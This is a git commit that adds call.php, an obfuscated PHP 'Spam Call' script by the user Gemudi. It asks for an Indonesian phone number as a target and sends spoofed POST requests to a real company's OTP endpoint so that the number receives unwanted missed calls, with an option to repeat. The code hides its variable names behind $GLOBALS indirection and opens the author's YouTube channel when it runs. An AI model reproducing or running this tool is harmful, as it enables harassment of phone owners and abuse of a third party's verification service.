74087fcc6e751e26650e3ea2d2b55c6522d1a40a
Gemudi <96980462+gemudi@users.noreply.github.com>
2022-01-03 00:41:28 +0700

    Create call.php

---
+++ call.php
@@ -0,0 +1,425 @@
+<?php $ {
+    "GLOBALS"
+}
+["qhywsqpfxdd"] = "call";
+$ {
+    "GLOBALS"
+}
+["dsjdmphow"] = "result";
+$ {
+    "GLOBALS"
+}
+["jnurccfegyrc"] = "ch";
+$ {
+    "GLOBALS"
+}
+["nrdujilx"] = "phone";
+$ {
+    "GLOBALS"
+}
+["vlzvwwpfy"] = "k";
+$ {
+    "GLOBALS"
+}
+["ttnweqkhkjd"] = "lblue";
+$ {
+    "GLOBALS"
+}
+["cthetfw"] = "purple2";
+$ {
+    "GLOBALS"
+}
+["agllofcdjf"] = "purple";
+$ {
+    "GLOBALS"
+}
+["gsvtqntdqg"] = "yellow2";
+$ {
+    "GLOBALS"
+}
+["qmjedgeb"] = "yellow";
+$ {
+    "GLOBALS"
+}
+["igtecyuq"] = "green";
+$ {
+    "GLOBALS"
+}
+["cjxnrbm"] = "putih";
+$ {
+    "GLOBALS"
+}
+["efoohhlptade"] = "hitam";
+date_default_timezone_set("Asia/Jakarta");
+$wcixnniysq = "red";
+$ {
+    "GLOBALS"
+}
+["csdngwhhjun"] = "u";
+$uffsiydguige = "res";
+$ {
+    "GLOBALS"
+}
+["orflbytkyj"] = "green2";
+system("clear");
+$ {
+    $uffsiydguige
+} = "[0m";
+$ {
+    "GLOBALS"
+}
+["ygdddiwfjhj"] = "abu2";
+$ {
+    "GLOBALS"
+}
+["nokpyhs"] = "blue2";
+$ {
+    "GLOBALS"
+}
+["uulwasx"] = "red2";
+$mfcsdyo = "js";
+$ {
+    "GLOBALS"
+}
+["offgspcumy"] = "putih2";
+$ {
+    $ {
+        "GLOBALS"
+    }
+    ["efoohhlptade"]
+} = "[0;30m";
+$ {
+    $ {
+        "GLOBALS"
+    }
+    ["ygdddiwfjhj"]
+} = "[1;30m";
+$ {
+    $ {
+        "GLOBALS"
+    }
+    ["cjxnrbm"]
+} = "[0;37m";
+$ {
+    $ {
+        "GLOBALS"
+    }
+    ["offgspcumy"]
+} = "[1;37m";
+$ {
+    $wcixnniysq
+} = "[0;31m";
+$ {
+    $ {
+        "GLOBALS"
+    }
+    ["uulwasx"]
+} = "[1;31m";
+$jyecemrp = "yellow2";
+$mwteguwddo = "blue";
+$ {
+    $ {
+        "GLOBALS"
+    }
+    ["igtecyuq"]
+} = "[0;32m";
+$ {
+    "GLOBALS"
+}
+["gllkzrn"] = "purple2";
+$ {
+    $ {
+        "GLOBALS"
+    }
+    ["orflbytkyj"]
+} = "[1;32m";
+$ {
+    $ {
+        "GLOBALS"
+    }
+    ["qmjedgeb"]
+} = "[0;33m";
+$ {
+    "GLOBALS"
+}
+["lfxqdkyh"] = "lblue2";
+$ {
+    $ {
+        "GLOBALS"
+    }
+    ["gsvtqntdqg"]
+} = "[1;33m";
+$ {
+    $mwteguwddo
+} = "[0;34m";
+$ {
+    $ {
+        "GLOBALS"
+    }
+    ["nokpyhs"]
+} = "[1;34m";
+$ {
+    $ {
+        "GLOBALS"
+    }
+    ["agllofcdjf"]
+} = "[0;35m";
+$ {
+    "GLOBALS"
+}
+["srmihmkvdqee"] = "putih";
+$ {
+    $ {
+        "GLOBALS"
+    }
+    ["cthetfw"]
+} = "[1;35m";
+$ {
+    $ {
+        "GLOBALS"
+    }
+    ["ttnweqkhkjd"]
+} = "[0;36m";
+$ {
+    $ {
+        "GLOBALS"
+    }
+    ["lfxqdkyh"]
+} = "[1;36m";
+$ {
+    $mfcsdyo
+} = "json_decode";
+$ {
+    $ {
+        "GLOBALS"
+    }
+    ["vlzvwwpfy"]
+} = $ {
+    $jyecemrp
+} . "" . $ {
+    $ {
+        "GLOBALS"
+    }
+    ["cjxnrbm"]
+};
+$ {
+    $ {
+        "GLOBALS"
+    }
+    ["csdngwhhjun"]
+} = $ {
+    $ {
+        "GLOBALS"
+    }
+    ["gllkzrn"]
+} . "" . $ {
+    $ {
+        "GLOBALS"
+    }
+    ["srmihmkvdqee"]
+};
+class MyCall {
+    protected static $agent;
+    function __construct() {
+        $ {
+            "GLOBALS"
+        }
+        ["fgjzcnb"] = "agent";
+        self::$ {
+            $ {
+                "GLOBALS"
+            }
+            ["fgjzcnb"]
+        } = "Mozilla/5.0 (Linux; Android 8.1.0; CPH1853) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36";
+        $this->run();
+    }
+    var $logo = "
+  \e[32m
+ 
+ [1;31m     [1;32m   
+ [1;31m     [1;32m   
+ [1;33m
+ [1;35m[-] [1;36mMessage  : [1;37mSelamat Datang                            
+ [1;35m[-] [1;36mServer   : [1;37mOnline                                    
+ [1;35m[-] [1;36mScript   : [1;37mSpam Call                                 
+ [1;35m[-] [1;36mVersi    : [1;37m1.0                                       
+ [1;33m
+ [1;35m[-] [1;36mCreator  : [1;37mGemudi                   
+ [1;35m[-] [1;36mYoutube  : [1;37mGemudi Script    
+ [1;33m
+                
+ [1;33m[1;32mINPUT DATA TARGET[1;33m
+";
+    public function run() {
+        try {
+            $fwcxlvzkq = "coli";
+            system("clear");
+            $ {
+                "GLOBALS"
+            }
+            ["gxonsgtwb"] = "phone";
+            $ {
+                "GLOBALS"
+            }
+            ["sejnndydo"] = "coli";
+            $lkilkkqrfy = "call";
+            echo $this->logo;
+            $gdjugqjbpyg = "coli";
+            echo " [1;35m[] [1;33mNOMOR [1;37m(08) : [1;37m";
+            $ {
+                $ {
+                    "GLOBALS"
+                }
+                ["gxonsgtwb"]
+            } = trim(fgets(STDIN));
+            if (substr($ {
+                $ {
+                    "GLOBALS"
+                }
+                ["nrdujilx"]
+            }, 0, 2) !== "08") {
+                throw new Exception("
+ [1;37mMessage: [1;31mGunakan angka awalan 08
+
+");
+                exit(0);
+            }
+            sleep(1);
+            $udhrsgvflhs = "url";
+            system("xdg-open https://www.youtube.com/gemudi");
+            $ {
+                $udhrsgvflhs
+            } = "https://www.nutriclub.co.id/otp/?phone={$phone}&old_phone={$phone}";
+            for ($ {
+                $gdjugqjbpyg
+            } = 0;$ {
+                $ {
+                    "GLOBALS"
+                }
+                ["sejnndydo"]
+            } <= 0;$ {
+                $fwcxlvzkq
+            }
+            ++) {
+                $ilxajcfkc = "ch";
+                $ondppkbkf = "url";
+                $ {
+                    "GLOBALS"
+                }
+                ["qpxafhk"] = "ch";
+                $ {
+                    $ilxajcfkc
+                } = curl_init();
+                $qiowueyh = "agent";
+                curl_setopt($ {
+                    $ {
+                        "GLOBALS"
+                    }
+                    ["jnurccfegyrc"]
+                }, CURLOPT_URL, $ {
+                    $ondppkbkf
+                });
+                curl_setopt($ {
+                    $ {
+                        "GLOBALS"
+                    }
+                    ["jnurccfegyrc"]
+                }, CURLOPT_POST, 1);
+                curl_setopt($ {
+                    $ {
+                        "GLOBALS"
+                    }
+                    ["qpxafhk"]
+                }, CURLOPT_USERAGENT, "User-agent" . self::$ {
+                    $qiowueyh
+                });
+                curl_setopt($ {
+                    $ {
+                        "GLOBALS"
+                    }
+                    ["jnurccfegyrc"]
+                }, CURLOPT_RETURNTRANSFER, 1);
+                $ {
+                    $ {
+                        "GLOBALS"
+                    }
+                    ["dsjdmphow"]
+                } = curl_exec($ {
+                    $ {
+                        "GLOBALS"
+                    }
+                    ["jnurccfegyrc"]
+                });
+                if (strpos($ {
+                    $ {
+                        "GLOBALS"
+                    }
+                    ["dsjdmphow"]
+                }, "Request misscall berhasil")) {
+                    echo " [1;35m[] [1;33mINFO: 
+       [1;32m[Code]   : 30
+       [Msisdn] : $phone
+       [Pesan]  : Request misscall berhasil
+       [Total]  : 1
+
+
+";
+                } else {
+                    echo " [1;35m[] [1;33mINFO: 
+       [1;32m[Code]   : 30
+       [Msisdn] : $phone
+       [Pesan]  : Request failed sudah dilakukan 3x
+       [Total]  : 1
+
+
+";
+                }
+            }
+            echo " [1;35m> [1;31mLanjut lagi ?
+ [1;35m> [1;33m[y/n]
+ [1;35m> [1;33mJawab: [1;33m";
+            $ {
+                $ {
+                    "GLOBALS"
+                }
+                ["qhywsqpfxdd"]
+            } = trim(fgets(STDIN));
+            if ($ {
+                $ {
+                    "GLOBALS"
+                }
+                ["qhywsqpfxdd"]
+            } == "y" or $ {
+                $lkilkkqrfy
+            } == "Y") {
+                $this->run();
+            } else if ($ {
+                $ {
+                    "GLOBALS"
+                }
+                ["qhywsqpfxdd"]
+            } == "n" or $ {
+                $ {
+                    "GLOBALS"
+                }
+                ["qhywsqpfxdd"]
+            } == "N") {
+                exit("
+ >>>Jangan Lupa Subscribe My Channel Gemudi <<<
+
+");
+            } else {
+                exit("
+Subrek Cooy.. !!
+
+");
+            }
+        }
+        catch(Exception $e) {
+            echo $e->getMessage();
+        }
+    }
+}
+new MyCall;
+?>
+
